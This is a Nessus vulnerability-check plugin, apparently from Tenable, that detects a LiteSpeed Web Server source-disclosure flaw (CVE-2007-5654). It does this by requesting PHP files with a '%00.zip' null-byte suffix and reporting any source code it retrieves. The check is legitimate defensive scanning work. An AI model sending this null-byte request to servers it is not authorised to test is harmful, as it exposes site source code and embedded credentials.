#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(27523);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2007-5654");
  script_bugtraq_id(26163);
  script_osvdb_id(41867);
  script_xref(name:"EDB-ID", value:"4556");

  script_name(english:"LiteSpeed Web Server MIME Type Injection Null Byte Script Source Code Disclosure");
  script_summary(english:"Tries to retrieve script source code using LiteSpeed");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running LiteSpeed Web Server, a high-performance
web server.

The version of LiteSpeed Web Server installed on the remote host
allows an attacker to view the contents of files due to a flaw in its
handling of MIME types.  By passing in a filename followed by a null
byte and an extension, such as '.txt', a remote attacker can may be
able to uncover sensitive information, such as credentials and host
names contained in scripts, configuration files, etc." );
 script_set_attribute(attribute:"see_also", value:"http://www.litespeedtech.com/support/forum/showthread.php?t=1445" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1009f250" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to LiteSpeed Web Server 3.2.4 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');
 script_cwe_id(200);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/10/23");
 script_cvs_date("$Date: 2016/05/20 14:03:01 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 8088);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:8088);

# Make sure the banner is from LiteSpeed.
banner = get_http_banner(port:port);
if ("LiteSpeed" >!< banner ) exit(0, "LiteSpeed is not running on port "+port);


# Check whether it's vulnerable.
max_files = 10;
files = get_kb_list(string("www/", port, "/content/extensions/php"));
if (isnull(files)) files = make_list("/index.php", "/phpinfo.php");

n = 0;
foreach file (files)
{
  # Try to get the source.
  w = http_send_recv3(method: "GET", item:string(file, "%00.zip"), port:port);
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = strcat(w[0], w[1], '\r\n', w[2]);

  # If it looks like the source code...
  if (
    file =~ "\.php$" && "<?" >< res && "?>" >< res && "Content-Type: application/zip" >< res
  )
  {
    # Now run the script.
    w = http_send_recv3(method:"GET", item:file, port:port);
    if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
    res2 = w[2];

    # There's a problem if the response does not look like source code this time.
    if (file =~ "\.php$" && "<?" >!< res2 && "?>" >!< res2)
    {
      res = strstr(res, '\n<');
      report = string(
        "Here is the source that Nessus was able to retrieve for the URL \n",
        "'", file, "' :\n",
        "\n",
        res
      );
      security_warning(port:port, extra:report); 
      exit(0);
    }
  }
  if (n++ > max_files) exit(0);
}
